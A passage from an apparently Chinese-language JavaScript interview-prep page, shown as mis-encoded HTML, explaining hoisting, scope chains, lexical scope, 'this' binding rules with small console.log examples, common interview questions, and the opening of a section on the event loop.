å£°æ˜çš„å˜é‡ä¼šè¢«æå‡åˆ°å‡½æ•°&#x2F;å…¨å±€ä½œç”¨åŸŸçš„é¡¶éƒ¨</li><li>let å’Œ const æœ‰æš‚æ—¶æ€§æ­»åŒºï¼ˆTDZï¼‰ï¼Œä¸ä¼šæå‡</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(a); <span class="hljs-comment">// undefined (å˜é‡æå‡)</span><br><span class="hljs-keyword">var</span> a = <span class="hljs-number">1</span>;<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(b); <span class="hljs-comment">// æŠ¥é”™: Cannot access &#x27;b&#x27; before initialization</span><br><span class="hljs-keyword">let</span> b = <span class="hljs-number">2</span>;<br></code></pre></td></tr></table></figure><h2 id="ä½œç”¨åŸŸé“¾ï¼ˆScope-Chainï¼‰"><a href="#ä½œç”¨åŸŸé“¾ï¼ˆScope-Chainï¼‰" class="headerlink" title="ä½œç”¨åŸŸé“¾ï¼ˆScope Chainï¼‰"></a>ä½œç”¨åŸŸé“¾ï¼ˆScope Chainï¼‰</h2><p><strong>åŸºæœ¬æ¦‚å¿µ</strong></p><ul><li>å½“è®¿é—®ä¸€ä¸ªå˜é‡æ—¶ï¼ŒJavaScript ä¼šä»å½“å‰ä½œç”¨åŸŸå¼€å§‹æŸ¥æ‰¾</li><li>å¦‚æœå½“å‰ä½œç”¨åŸŸå†…æ‰¾ä¸åˆ°æ—¶ï¼Œä¼šå‘ä¸Šä¸€çº§ä½œç”¨åŸŸæŸ¥æ‰¾ï¼Œç›´è‡³å…¨å±€ä½œç”¨åŸŸ</li><li>è¿™ç§é“¾å¼æŸ¥æ‰¾è¿‡ç¨‹è¢«ç§°ä¸ºä½œç”¨åŸŸé“¾</li></ul><p><strong>ä½œç”¨åŸŸé“¾çš„å½¢æˆ</strong></p><ul><li>æ¯ä¸ªå‡½æ•°åœ¨åˆ›å»ºæ—¶éƒ½ä¼šä¿å­˜å…¶æ‰€åœ¨çš„ä½œç”¨åŸŸé“¾</li><li>å‡½æ•°åœ¨æ‰§è¡Œæ—¶ä¼šåˆ›å»ºæ–°çš„ä½œç”¨åŸŸé“¾ï¼Œå¹¶æ·»åŠ åˆ°ä½œç”¨åŸŸé“¾å‰ç«¯</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">var</span> globalVar = <span class="hljs-string">&#x27;global&#x27;</span>;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">outer</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">var</span> outerVar = <span class="hljs-string">&#x27;outer&#x27;</span>;<br>  <br>  <span class="hljs-keyword">function</span> <span class="hljs-title function_">inner</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">var</span> innerVar = <span class="hljs-string">&#x27;inner&#x27;</span>;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(innerVar); <span class="hljs-comment">// å½“å‰ä½œç”¨åŸŸ</span><br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(outerVar); <span class="hljs-comment">// å¤–å±‚ä½œç”¨åŸŸ</span><br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(globalVar); <span class="hljs-comment">// å…¨å±€ä½œç”¨åŸŸ</span><br>  &#125;<br>  <br>  <span class="hljs-title function_">inner</span>();<br>&#125;<br><br><span class="hljs-title function_">outer</span>();<br></code></pre></td></tr></table></figure><p><strong>è¯æ³•ä½œç”¨åŸŸï¼ˆé™æ€ä½œç”¨åŸŸï¼‰</strong></p><ul><li>JavaScript é‡‡ç”¨è¯æ³•ä½œç”¨åŸŸï¼Œä½œç”¨åŸŸåœ¨å‡½æ•°å®šä¹‰æ—¶å°±ç¡®å®šäº†</li><li>ä¸è°ƒç”¨ä½ç½®æ— å…³</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">var</span> a = <span class="hljs-string">&#x27;global&#x27;</span>;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">foo</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(a);<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">bar</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">var</span> a = <span class="hljs-string">&#x27;local&#x27;</span>;<br>  <span class="hljs-title function_">foo</span>(); <span class="hljs-comment">// è¾“å‡º &quot;global&quot; è€Œä¸æ˜¯ &quot;local&quot;</span><br>&#125;<br><br><span class="hljs-title function_">bar</span>();<br></code></pre></td></tr></table></figure><h2 id="this-æŒ‡å‘"><a href="#this-æŒ‡å‘" class="headerlink" title="this æŒ‡å‘"></a>this æŒ‡å‘</h2><p><strong>åŸºæœ¬æ¦‚å¿µ</strong></p><ul><li>this æ˜¯ä¸€ä¸ªç‰¹æ®Šçš„å¯¹è±¡ï¼ŒæŒ‡å‘å½“å‰æ‰§è¡Œä¸Šä¸‹æ–‡</li><li>this çš„å€¼å–å†³äºå‡½æ•°çš„è°ƒç”¨æ–¹å¼</li></ul><p><strong>this çš„ç»‘å®šè§„åˆ™</strong></p><p>ï¼ˆ1ï¼‰é»˜è®¤ç»‘å®š</p><ul><li>ç‹¬ç«‹å‡½æ•°è°ƒç”¨æ—¶ï¼Œthis æŒ‡å‘å…¨å±€å¯¹è±¡</li><li>ä¸¥æ ¼æ¨¡å¼ä¸‹ä¸º undefined</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">foo</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>); <span class="hljs-comment">// æµè§ˆå™¨ä¸­æŒ‡å‘ window</span><br>&#125;<br><span class="hljs-title function_">foo</span>();<br></code></pre></td></tr></table></figure><p>ï¼ˆ2ï¼‰éšå£«ç»‘å®š</p><ul><li>ä½œä¸ºå¯¹è±¡æ–¹æ³•è°ƒç”¨æ—¶ï¼Œthis æŒ‡å‘è°ƒç”¨å¯¹è±¡</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> obj = &#123;<br>  <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;Alice&#x27;</span>,<br>  <span class="hljs-attr">sayName</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>);<br>  &#125;<br>&#125;;<br><br>obj.<span class="hljs-title function_">sayName</span>(); <span class="hljs-comment">// &quot;Alice&quot; (this æŒ‡å‘ obj)</span><br></code></pre></td></tr></table></figure><p>ï¼ˆ3ï¼‰æ˜¾ç¤ºç»‘å®š</p><ul><li>ä½¿ç”¨ callã€applyã€bind å¼ºåˆ¶æŒ‡å®š this</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">greet</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Hello, <span class="hljs-subst">$&#123;<span class="hljs-variable language_">this</span>.name&#125;</span>`</span>);<br>&#125;<br><br><span class="hljs-keyword">const</span> person = &#123; <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;Bob&#x27;</span> &#125;;<br><br>greet.<span class="hljs-title function_">call</span>(person); <span class="hljs-comment">// &quot;Hello, Bob&quot;</span><br></code></pre></td></tr></table></figure><p>ï¼ˆ4ï¼‰new ç»‘å®š</p><ul><li>æ„é€ å‡½æ•°è°ƒç”¨æ—¶ï¼Œthis æŒ‡å‘æ–°åˆ›å»ºçš„å¯¹è±¡</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Person</span>(<span class="hljs-params">name</span>) &#123;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;<br>&#125;<br><br><span class="hljs-keyword">const</span> p = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&#x27;Charlie&#x27;</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(p.<span class="hljs-property">name</span>); <span class="hljs-comment">// &quot;Charlie&quot;</span><br></code></pre></td></tr></table></figure><p>ï¼ˆ5ï¼‰ç®­å¤´å‡½æ•°</p><ul><li>ç®­å¤´å‡½æ•°æ²¡æœ‰è‡ªå·±çš„ thisï¼Œç»§æ‰¿å¤–å±‚ä½œç”¨åŸŸçš„ this</li><li>æ— æ³•é€šè¿‡ callã€applyã€bind æ”¹å˜</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> obj = &#123;<br>  <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;Dave&#x27;</span>,<br>  <span class="hljs-attr">sayName</span>: <span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>); <span class="hljs-comment">// æŒ‡å‘å¤–å±‚ this (å¯èƒ½æ˜¯ window)</span><br>  &#125;<br>&#125;;<br><br>obj.<span class="hljs-title function_">sayName</span>(); <span class="hljs-comment">// å¯èƒ½è¾“å‡º undefined</span><br></code></pre></td></tr></table></figure><p><strong>this çš„ç‰¹æ®Šæƒ…å†µ</strong></p><p>ï¼ˆ1ï¼‰å›è°ƒå‡½æ•°ä¸­çš„ this</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> obj = &#123;<br>  <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;Eve&#x27;</span>,<br>  <span class="hljs-attr">delayedGreet</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-built_in">setTimeout</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>); <span class="hljs-comment">// this æŒ‡å‘ window/undefined</span><br>    &#125;, <span class="hljs-number">100</span>);<br>  &#125;<br>&#125;;<br><br>obj.<span class="hljs-title function_">delayedGreet</span>(); <span class="hljs-comment">// è¾“å‡ºç©ºæˆ– undefined</span><br></code></pre></td></tr></table></figure><p>è§£å†³æ–¹æ³•ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// ä½¿ç”¨ç®­å¤´å‡½æ•°</span><br><span class="hljs-attr">delayedGreet</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>); <span class="hljs-comment">// ç»§æ‰¿å¤–å±‚ this</span><br>  &#125;, <span class="hljs-number">100</span>);<br>&#125;<br><br><span class="hljs-comment">// æˆ–ä¿å­˜ this</span><br><span class="hljs-attr">delayedGreet</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> self = <span class="hljs-variable language_">this</span>;<br>  <span class="hljs-built_in">setTimeout</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(self.<span class="hljs-property">name</span>);<br>  &#125;, <span class="hljs-number">100</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>ï¼ˆ2ï¼‰DOM äº‹ä»¶å¤„ç†å‡½æ•°</p><ul><li>äº‹ä»¶å¤„ç†å‡½æ•°ä¸­çš„ this æŒ‡å‘è§¦å‘äº‹ä»¶çš„å…ƒç´ </li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript">button.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;click&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>); <span class="hljs-comment">// æŒ‡å‘ button å…ƒç´ </span><br>&#125;);<br></code></pre></td></tr></table></figure><h2 id="ä¸‰è€…çš„å…³ç³»ä¸åŒºåˆ«"><a href="#ä¸‰è€…çš„å…³ç³»ä¸åŒºåˆ«" class="headerlink" title="ä¸‰è€…çš„å…³ç³»ä¸åŒºåˆ«"></a>ä¸‰è€…çš„å…³ç³»ä¸åŒºåˆ«</h2><table><thead><tr><th align="left">ç‰¹æ€§</th><th align="left">ä½œç”¨åŸŸ</th><th align="left">ä½œç”¨åŸŸé“¾</th><th align="left">thisæŒ‡å‘</th></tr></thead><tbody><tr><td align="left">å®šä¹‰</td><td align="left">å˜é‡çš„å¯è®¿é—®èŒƒå›´</td><td align="left">å˜é‡æŸ¥æ‰¾çš„é“¾å¼ç»“æ„</td><td align="left">å½“å‰æ‰§è¡Œä¸Šä¸‹æ–‡å¯¹è±¡</td></tr><tr><td align="left">ç¡®å®šæ—¶æœº</td><td align="left">ä»£ç ç¼–å†™æ—¶ï¼ˆè¯æ³•ä½œç”¨åŸŸï¼‰</td><td align="left">å‡½æ•°å®šä¹‰æ—¶</td><td align="left">å‡½æ•°è°ƒç”¨æ—¶</td></tr><tr><td align="left">å½±å“å› ç´ </td><td align="left">å˜é‡å£°æ˜ä½ç½®</td><td align="left">å‡½æ•°åµŒå¥—å±‚çº§</td><td align="left">è°ƒç”¨æ–¹å¼</td></tr><tr><td align="left">ä¿®æ”¹æ–¹å¼</td><td align="left">æ— æ³•åŠ¨æ€ä¿®æ”¹</td><td align="left">æ— æ³•åŠ¨æ€ä¿®æ”¹</td><td align="left">call&#x2F;apply&#x2F;bind&#x2F;new</td></tr><tr><td align="left">ç®­å¤´å‡½æ•°</td><td align="left">éµå®ˆå—çº§ä½œç”¨åŸŸ</td><td align="left">æ­£å¸¸å½¢æˆä½œç”¨åŸŸé“¾</td><td align="left">ç»§æ‰¿å¤–å±‚ this</td></tr></tbody></table><h2 id="é¢è¯•å¸¸è§é—®é¢˜-3"><a href="#é¢è¯•å¸¸è§é—®é¢˜-3" class="headerlink" title="é¢è¯•å¸¸è§é—®é¢˜"></a>é¢è¯•å¸¸è§é—®é¢˜</h2><p><strong>Qï¼švaryã€letã€const çš„ä½œç”¨åŸŸåŒºåˆ«ï¼Ÿ</strong></p><ul><li>varï¼šå‡½æ•°ä½œç”¨åŸŸï¼Œä¼šå˜é‡æå‡</li><li>let&#x2F;constï¼šå—çº§ä½œç”¨åŸŸï¼Œæœ‰æš‚æ—¶æ€§æ­»åŒºï¼ˆTDZï¼‰</li></ul><p><strong>Qï¼šä»€ä¹ˆæ˜¯é—­åŒ…ï¼Ÿå®ƒä¸ä½œç”¨åŸŸé“¾æœ‰ä»€ä¹ˆå…³ç³»ï¼Ÿ</strong></p><p>é—­åŒ…æ˜¯å¯ä»¥è®¿é—®è‡ªç”±å˜é‡çš„å‡½æ•°ï¼Œå®ƒé€šè¿‡ä½œç”¨åŸŸé“¾è®¿é—®å¤–å±‚å˜é‡ï¼Œå³ä½¿å¤–å±‚å‡½æ•°å·²ç»æ‰§è¡Œå®Œæ¯•</p><p><strong>Qï¼šç®­å¤´å‡½æ•°ä¸ºä»€ä¹ˆä¸èƒ½ç”¨ä½œæ„é€ å‡½æ•°ï¼Ÿ</strong></p><p>ç®­å¤´å‡½æ•°æ²¡æœ‰è‡ªå·±çš„ thisï¼Œä¹Ÿæ²¡æœ‰ prototype å±æ€§</p><p><strong>Qï¼šå¦‚ä½•æ”¹å˜ this æŒ‡å‘ï¼Ÿ</strong></p><p>é€šè¿‡ callã€applyã€bindã€new æˆ–ç®­å¤´å‡½æ•°ç­‰æ–¹å¼</p><p><strong>Qï¼šä»¥ä¸‹ä»£ç çš„è¾“å‡ºï¼Ÿ</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">var</span> name = <span class="hljs-string">&#x27;Global&#x27;</span>;<br><span class="hljs-keyword">const</span> obj = &#123;<br>  <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;Object&#x27;</span>,<br>  <span class="hljs-attr">sayName</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>);<br>  &#125;,<br>  <span class="hljs-attr">sayNameArrow</span>: <span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>);<br>  &#125;<br>&#125;;<br><br>obj.<span class="hljs-title function_">sayName</span>();       <span class="hljs-comment">// ?</span><br>obj.<span class="hljs-title function_">sayNameArrow</span>();  <span class="hljs-comment">// ?</span><br><span class="hljs-keyword">const</span> fn = obj.<span class="hljs-property">sayName</span>;<br><span class="hljs-title function_">fn</span>();                <span class="hljs-comment">// ?</span><br></code></pre></td></tr></table></figure><p>ç­”æ¡ˆï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-string">&quot;Object&quot;</span>  (éšå¼ç»‘å®š)<br><span class="hljs-string">&quot;Global&quot;</span>  (ç®­å¤´å‡½æ•°ç»§æ‰¿å…¨å±€ <span class="hljs-variable language_">this</span>)<br><span class="hljs-string">&quot;Global&quot;</span>  (é»˜è®¤ç»‘å®š)<br></code></pre></td></tr></table></figure><p><strong>Qï¼šå…¨å±€ä½œç”¨åŸŸä¸­çš„å˜é‡ä¼šå½¢æˆé—­åŒ…å¼•ç”¨å—ï¼Ÿ</strong></p><p>ä¸¥æ ¼æ¥è¯´ï¼Œå…¨å±€å˜é‡ä¸ä¼šå½¢æˆçœŸæ­£çš„é—­åŒ…å¼•ç”¨ã€‚é—­åŒ…æ˜¯æŒ‡å‡½æ•°èƒ½å¤Ÿè®¿é—®å¹¶ä¿æŒå¯¹å…¶è¯æ³•ä½œç”¨åŸŸï¼ˆé€šå¸¸æ˜¯å¤–éƒ¨å‡½æ•°ä½œç”¨åŸŸï¼‰å˜é‡çš„å¼•ç”¨ï¼Œè€Œå…¨å±€å˜é‡æœ¬èº«å°±å­˜åœ¨äºå…¨å±€ä½œç”¨åŸŸä¸­ï¼Œä»»ä½•å‡½æ•°éƒ½å¯ä»¥ç›´æ¥è®¿é—®ï¼Œä¸éœ€è¦ç‰¹æ®Šçš„é—­åŒ…æœºåˆ¶æ¥ä¿æŒè¿™äº›å˜é‡çš„å­˜åœ¨</p><p><strong>Qï¼šå…¨å±€ä½œç”¨åŸŸå†…ä½¿ç”¨ let å£°æ˜çš„å˜é‡ï¼Œç®—å—çº§ä½œç”¨åŸŸè¿˜æ˜¯å…¨å±€ä½œç”¨åŸŸï¼Ÿ</strong></p><p>å…¨å±€ä½œç”¨åŸŸå†…ä½¿ç”¨ let å£°æ˜çš„å˜é‡å…·æœ‰åŒé‡ç‰¹æ€§ï¼šä»ä½œç”¨èŒƒå›´æ¥çœ‹å®ƒæ˜¯å…¨å±€çš„ï¼Œå› ä¸ºåœ¨ä»»ä½•åœ°æ–¹éƒ½å¯ä»¥è®¿é—®ï¼›ä»ç»‘å®šè¡Œä¸ºä¸Šæ¥çœ‹å®ƒä¿æŒäº†å—çº§ä½œç”¨åŸŸçš„ç‰¹æ€§ï¼ŒåŒ…æ‹¬æš‚æ—¶æ€§æ­»åŒºã€ä¸ä¼šæˆä¸ºå…¨å±€å¯¹è±¡ï¼ˆæ¯”å¦‚ windowï¼‰çš„å±æ€§ã€‚è¿™ç§è®¾è®¡æ—¢ä¿è¯äº†å˜é‡çš„å…¨å±€å¯ç”¨æ€§ï¼Œåˆé¿å…äº†ä¼ ç»Ÿ var å£°æ˜å˜é‡å¸¦æ¥çš„å…¨å±€æ±¡æŸ“é—®é¢˜</p><h1 id="äº‹ä»¶å¾ªç¯å’Œæ¶ˆæ¯é˜Ÿåˆ—"><a href="#äº‹ä»¶å¾ªç¯å’Œæ¶ˆæ¯é˜Ÿåˆ—" class="headerlink" title="äº‹ä»¶å¾ªç¯å’Œæ¶ˆæ¯é˜Ÿåˆ—"></a>äº‹ä»¶å¾ªç¯å’Œæ¶ˆæ¯é˜Ÿåˆ—</h1><h2 id="äº‹ä»¶å¾ªç¯çš„æœ¬è´¨ä¸å¿…è¦æ€§"><a href="#äº‹ä»¶å¾ªç¯çš„æœ¬è´¨ä¸å¿…è¦æ€§" class="headerlink" title="äº‹ä»¶å¾ªç¯çš„æœ¬è´¨ä¸å¿…è¦æ€§"></a>äº‹ä»¶å¾ªç¯çš„æœ¬è´¨ä¸å¿…è¦æ€§</h2><p><strong>ä¸ºä»€ä¹ˆéœ€è¦äº‹ä»¶å¾ªç¯ï¼Ÿ</strong></p><p>JavaScript é‡‡ç”¨å•çº¿ç¨‹æ¨¡å‹è®¾è®¡ï¼Œä¸»è¦åŸºäºä»¥ä¸‹å‡ ç‚¹è€ƒè™‘ï¼š</p><ul><li>DOM æ“ä½œçš„ä¸€è‡´æ€§ï¼šå¤šçº¿ç¨‹åŒæ—¶æ“ä½œ DOM ä¼šå¸¦æ¥ä¸å¯é¢„æœŸçš„ç»“æœ</li><li>ç®€åŒ–ç¼–ç¨‹æ¨¡å‹ï¼šé¿å…äº†å¤šçº¿ç¨‹ç¼–ç¨‹ä¸­çš„å¤æ‚æ€§ï¼Œæ¯”å¦‚æ­»é”ã€èµ„æºç«äº‰ç­‰</li><li>é€‚åˆ web åº”ç”¨åœºæ™¯ï¼šweb åº”ç”¨ä¸»è¦æ˜¯ I&#x2F;O å¯†é›†å‹è€Œéè®¡ç®—å¯†é›†å‹</li></ul><p>è€Œé‡‡ç”¨å•çº¿ç¨‹æ¨¡å‹è®¾è®¡ï¼Œå°±æ„å‘³ç€æ‰€æœ‰ä»»åŠ¡å¿…é¡»æ’é˜Ÿç­‰å¾…æ‰§è¡Œï¼Œå¦‚æœå‰ä¸€ä¸ªä»»åŠ¡æ‰§è¡Œæ—¶é—´è¿‡é•¿ï¼Œå°±ä¼šé˜»å¡åç»­ä»»åŠ¡ã€‚äº‹ä»¶å¾ªç¯æœºåˆ¶è§£å†³äº†è¿™ä¸ªé—®é¢˜ï¼Œä½¿å¾—JavaScript èƒ½å¤Ÿå®ç°éé˜»å¡çš„å¼‚æ­¥æ“ä½œ</p><p><strong>äº‹ä»¶å¾ªç¯çš„å®šä¹‰</strong><br>äº‹ä»¶å¾ªç¯æ˜¯ JavaScript è¿è¡Œæ—¶å¯¹ä»»åŠ¡è°ƒåº¦çš„å®ç°æ–¹å¼ï¼Œå®ƒåè°ƒåŒæ­¥ä»£ç æ‰§è¡Œã€å¼‚æ­¥å›è°ƒå¤„ç†ã€UI æ¸²æŸ“ç­‰æ“ä½œã€‚æœ¬è´¨ä¸Šï¼Œäº‹ä»¶å¾ªç¯æ˜¯ä¸€ä¸ªä¸æ–­æ£€æŸ¥ä»»åŠ¡é˜Ÿåˆ—å¹¶æ‰§è¡Œä»»åŠ¡çš„å¾ªç¯è¿‡ç¨‹</p><h2 id="äº‹ä»¶å¾ªç¯çš„æ ¸å¿ƒç»„æˆ"><a href="#äº‹ä»¶å¾ªç¯çš„æ ¸å¿ƒç»„æˆ" class="headerlink" title="äº‹ä»¶å¾ªç¯çš„æ ¸å¿ƒç»„æˆ"></a>äº‹ä»¶å¾ªç¯çš„æ ¸å¿ƒç»„æˆ</h2><p><strong>è°ƒç”¨æ ˆï¼ˆCall Stackï¼‰</strong></p><p>è°ƒç”¨æ ˆæ˜¯å­˜å‚¨å‡½æ•°è°ƒç”¨çš„æ ˆç»“æ„ï¼Œéµå¾ªâ€œåè¿›å…ˆå‡ºâ€åŸåˆ™ã€‚å½“å‡½æ•°è¢«è°ƒç”¨æ—¶ä¼šè¢«å‹å…¥æ ˆé¡¶ï¼Œæ‰§è¡Œå®Œæ¯•åä»æ ˆé¡¶å¼¹å‡º</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">foo</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;foo&#x27;</span>);<br>  <span class="hljs-title function_">bar</span>();<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">bar</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;bar&#x27;</span>);<br>&#125;<br><br><span class="hljs-title function_">foo</span>();<br></code></pre></td></tr></table></figure><p>ä¸Šè¿°ä»£ç çš„è°ƒç”¨æ ˆå˜åŒ–ï¼š</p><ol><li>foo()å…¥æ ˆ</li><li>console.log(â€˜fooâ€™)å…¥æ ˆå¹¶æ‰§è¡Œï¼Œç„¶åå‡ºæ ˆ</li><li>bar()å…¥æ ˆ</li><li>console.log(â€˜barâ€™)å…¥æ ˆå¹¶æ‰§è¡Œï¼Œç„¶åå‡ºæ ˆ</li><li>bar()å‡ºæ ˆ</li><li>foo()å‡ºæ ˆ</li></ol><p><strong>ä»»åŠ¡é˜Ÿåˆ—ï¼ˆTask Queueï¼‰</strong></p><p>ä»»åŠ¡é˜Ÿåˆ—æ˜¯ä¸€ç§å…ˆè¿›å…ˆå‡ºï¼ˆFIFOï¼‰çš„æ•°æ®ç»“æ„ï¼Œç”¨äºå­˜å‚¨å¾…æ‰§è¡Œçš„å¼‚æ­¥ä»»åŠ¡å›è°ƒï¼Œå½“ JavaScript ä¸»çº¿ç¨‹æ‰§è¡Œå®Œå½“å‰è°ƒç”¨æ 